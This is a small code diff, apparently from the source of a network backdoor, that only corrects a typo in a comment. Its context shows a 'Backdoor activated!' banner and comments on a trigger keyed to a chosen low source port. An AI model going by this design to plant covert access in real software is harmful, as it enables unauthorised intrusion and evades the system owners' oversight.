@@ -48,7 +48,7 @@
                " [\033[32;1m+\033[0m] \033[32;1mBackdoor activated! Enjoy!\n" \
                "\033[0m\n"
 
-// This is the the backdoor trigger.  If the source port
+// This is the backdoor trigger.  If the source port
 // came from this port, then the backdoor will trigger.
 // Using a low number privilege ports will likely avoid
 // accidental triggers
